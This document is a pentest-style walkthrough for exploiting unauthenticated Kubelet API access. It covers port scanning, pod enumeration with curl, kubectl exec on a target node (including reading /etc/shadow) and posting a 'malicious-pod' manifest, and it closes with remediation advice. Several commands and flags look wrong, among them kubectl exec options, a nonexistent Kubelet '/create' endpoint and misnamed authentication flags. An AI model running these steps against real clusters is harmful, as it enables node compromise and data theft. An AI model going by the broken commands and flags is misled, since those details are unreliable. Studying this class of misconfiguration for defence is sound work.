
# Kubelet Unauthorized Access Exploitation

## 1. Overview

This document details the exploitation of unauthorized access to the Kubelet API. The Kubelet, an agent running on each node in a Kubernetes cluster, manages containers.  When its API is accessible without proper authentication/authorization, an attacker can gain significant control over the node and potentially the entire cluster.

**Attack Vector Description:**

An attacker discovers that the Kubelet's API endpoint (typically running on port 10250, 10255 or 10248) is exposed publicly or within the network without proper authentication and authorization mechanisms enabled. This means anyone who can reach the endpoint can interact with the Kubelet API, allowing for node compromise.

**Potential Impact and Consequences:**

*   **Container Execution:** Attacker can execute arbitrary commands within existing containers or create new containers with malicious payloads.
*   **Node Compromise:** By executing commands or deploying containers with elevated privileges, the attacker can gain root access to the worker node.
*   **Data Exfiltration:**  Sensitive data stored within containers or on the node can be exfiltrated.
*   **Denial of Service:**  The attacker can disrupt services by stopping containers or overloading the node's resources.
*   **Lateral Movement:** A compromised node can be used as a pivot point to attack other services within the cluster or the wider network.
*   **Cluster Compromise:**  If the attacker gains access to service account tokens, they can potentially escalate privileges to control the entire Kubernetes cluster.

**Risk Level Assessment:**

**Critical** (If Kubelet API is exposed to the internet).  **High** (If Kubelet API is accessible from within the internal network without authentication).

**Technical Explanation of Why This Vulnerability Exists:**

The vulnerability arises when the Kubelet's `--authentication-anonymous` flag is set to `true`, or when authentication/authorization are disabled altogether (e.g., `--authorization-mode=AlwaysAllow`).  In older versions, the default settings for Kubelet were often insecure, enabling anonymous access.  Misconfiguration or failure to properly secure the Kubelet API leads to this exposure.  Additionally, firewall rules that are too permissive might allow unauthorized access.

**Prerequisites and Conditions Needed:**

*   Network access to the Kubelet API endpoint (typically port 10250, 10255 or 10248).
*   Knowledge of the Kubelet API endpoint IP address and port.
*   Anonymous authentication enabled (or disabled authentication) on the Kubelet.
*   The target Kubelet version might affect available API endpoints and exploitation techniques.

## 2. Validation and Exploitation Steps

This section demonstrates how to validate and exploit unauthorized access to the Kubelet API.

**Phase 1: Validation (Determining Vulnerability)**

**Step 1: Determine Kubelet API Endpoint**

```bash
# Attempt to discover the Kubelet API endpoint by checking common ports.
# Replace <target_node_ip> with the actual IP address of the Kubernetes node.
nmap -p 10250,10255,10248 <target_node_ip>
```

*   **Explanation:** `nmap` is used to scan the target IP address for open ports commonly associated with the Kubelet API (10250, 10255, 10248).
*   **Why:** This identifies which port the Kubelet is listening on.
*   **Expected Output:**  Output showing one or more of the ports (10250, 10255, or 10248) as "open".
*   **Contributes To:** Discovering the active Kubelet API endpoint.
*   **Variations:** If `nmap` isn't available, `telnet <target_node_ip> <port>` can be used to test connectivity to each port individually.

**Step 2: Check Kubelet API Access Without Authentication**

```bash
# Attempt to retrieve the Kubelet's API version.
# Replace <target_node_ip> and <kubelet_port> with the actual values.
curl -k https://<target_node_ip>:<kubelet_port>/version
```

*   **Explanation:** `curl` is used to make an HTTPS request to the Kubelet's `/version` endpoint without providing any authentication.  The `-k` flag disables certificate verification, which is often necessary in test environments.
*   **Why:** Checks if the API is accessible without authentication. A successful response indicates a vulnerability.
*   **Expected Output:** If successful, the command will return the Kubelet version information in JSON format, e.g., `{"major":"1","minor":"23","gitVersion":"v1.23.4","gitCommit":"abcdef1234567890","gitTreeState":"clean","buildDate":"2022-01-01T00:00:00Z","goVersion":"go1.17","compiler":"gc","platform":"linux/amd64"}`.  If you get an error like "Unauthorized", authentication is required and the vulnerability is less likely.
*   **Contributes To:** Validating the presence of unauthorized access.
*   **Variations:**  `wget --no-check-certificate https://<target_node_ip>:<kubelet_port>/version` can be used as an alternative to `curl`.

**Phase 2: Exploitation (Gaining Access and Executing Commands)**

**Step 3: List Running Pods (Enumeration)**

```bash
# List all pods running on the node through Kubelet API.
# Replace <target_node_ip> and <kubelet_port> with the actual values.
curl -k https://<target_node_ip>:<kubelet_port>/pods
```

*   **Explanation:**  This command retrieves information about all pods running on the node from the `/pods` endpoint.
*   **Why:** Enumerating running pods allows the attacker to identify potential targets for further exploitation (e.g., executing commands within a specific pod).
*   **Expected Output:** A JSON list containing detailed information about each pod, including its name, namespace, containers, and status.
*   **Contributes To:** Identifying target containers for command execution.
*   **Variations:** You can parse the JSON output with `jq` to filter and extract specific information (e.g., `curl -k https://<target_node_ip>:<kubelet_port>/pods | jq '.[].metadata.name'`).

**Step 4: Execute Command Inside a Container (Remote Command Execution)**

This step leverages the Kubelet's `/exec` endpoint to execute a command within a specified container.  This requires identifying a specific container ID and the target command.

First, extract the pod name, namespace, and container name from the output of step 3.  Let's assume we have:

*   `pod_name="my-app-pod"`
*   `namespace="default"`
*   `container_name="my-app-container"`

```bash
# Prepare the command execution request. Replace placeholders with actual values.
# Ensure 'kubectl' is installed and configured to communicate with the cluster.
kubectl --insecure-skip-tls-verify exec -n ${namespace} ${pod_name} -c ${container_name} -- sh -c "whoami"  --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --address=<target_node_ip> --port=<kubelet_port>
```

*   **Explanation:** This uses `kubectl` to execute a command (`sh -c "whoami"`) inside the specified container.  The crucial part is using the `--kubelet-preferred-address-types` , `--address` and `--port` flags to direct kubectl to communicate directly with the Kubelet, bypassing the Kubernetes API server. `kubectl` typically communicates with the Kubelet via the Kubernetes API server.  However, we are exploiting the direct Kubelet access. `--insecure-skip-tls-verify` is needed due to the potential for untrusted self-signed certificates. The `-n` flag specifies the namespace. The `-c` flag specifies the container name.
*   **Why:** This attempts to execute a simple command to confirm code execution within the container. The `whoami` command reveals the user identity under which the container is running.
*   **Expected Output:**  If successful, the command will output the username associated with the running process, which may be `root` or some other user.  An error indicates either the container ID is invalid, or the `/exec` endpoint is not accessible.
*   **Contributes To:** Gaining control over the container by executing arbitrary commands.
*   **Variations:**  Replace `sh -c "whoami"` with any other command you want to execute. For example, `sh -c "cat /etc/shadow"` to attempt to read the password file (if running as root and accessible).

**Step 5: (If Available, More Recent Kubelets) Container Resource Creation (Advanced Exploitation)**

Some Kubelet versions expose a `/create` endpoint that allows for creating pods and containers.  This requires more detailed configuration, but allows creation of fully malicious containers.  The exact configuration depends highly on the Kubelet and Kubernetes versions.  Example (Highly dependent on Kubelet version and configuration):

```bash
# Example - adjust based on environment!  This is a template, NOT a direct copy/paste.
# Replace placeholders with actual values.  This requires creating a Pod manifest (pod.yaml).
# Example pod.yaml:
# apiVersion: v1
# kind: Pod
# metadata:
#   name: malicious-pod
# spec:
#   containers:
#   - name: malicious-container
#     image: alpine/git
#     command: ["/bin/sh", "-c", "while true; do echo 'Compromised!'; sleep 1; done"]

#  Note that the command is dangerous! Only use this in a test/isolated environment.

# Convert the Pod manifest to JSON
kubectl get pod malicious-pod -n default -o json > pod.json

# Create the container using the Kubelet API.  Requires very specific configuration based on Kubelet version.
curl -k -X POST -H "Content-Type: application/json" --data @pod.json https://<target_node_ip>:<kubelet_port>/create
```

*   **Explanation:** This is a much more complex exploitation method. It involves creating a Pod manifest (YAML or JSON), converting it to JSON, and then sending a POST request to the Kubelet's `/create` endpoint.  The pod manifest defines the container to be created, including its image, command, and resources. **This is only illustrative and REQUIRES significant version-specific adjustments.**
*   **Why:** Allows the attacker to create new, potentially malicious containers on the node, providing persistent access and control.
*   **Expected Output:**  A successful response will indicate that the pod was created. However, the exact response format varies depending on the Kubelet version. An error indicates that the `/create` endpoint is not available, the request format is invalid, or the Kubelet lacks the necessary permissions.
*   **Contributes To:**  Gaining persistent control over the node through malicious container deployment.
*   **Variations:**  The pod manifest can be customized to deploy different types of containers with various capabilities.  Exploitation often involves creating containers with mounted host directories or privileged access to the node.

**Remediation Recommendations:**

*   **Enable Authentication and Authorization:**  The most critical step is to enable proper authentication and authorization on the Kubelet API.  This can be achieved by configuring the `--authentication-mode` and `--authorization-mode` flags. Consider using modes like `Webhook` or `RBAC` to integrate with existing Kubernetes authentication and authorization mechanisms.
*   **Disable Anonymous Authentication:**  Ensure that the `--authentication-anonymous` flag is set to `false`.
*   **Enable TLS Encryption:**  Enable TLS encryption for all communication with the Kubelet API using the `--tls-cert-file` and `--tls-private-key-file` flags.  This protects sensitive data from eavesdropping.
*   **Network Segmentation and Firewalls:**  Restrict network access to the Kubelet API to only authorized sources (e.g., the Kubernetes API server). Use network policies and firewalls to limit access to the Kubelet port (10250, 10255 or 10248).
*   **Principle of Least Privilege:**  Grant containers only the minimum necessary privileges. Avoid running containers as root whenever possible.
*   **Regular Security Audits:**  Conduct regular security audits to identify and address potential misconfigurations or vulnerabilities.
*   **Kubelet Version:** Keep the Kubelet version up to date.

This comprehensive documentation provides a clear understanding of the Kubelet unauthorized access vulnerability, its potential impact, and step-by-step instructions for validation and exploitation. It also offers essential remediation recommendations to mitigate this critical security risk. Remember to test these exploits responsibly and only on systems you have explicit permission to test.
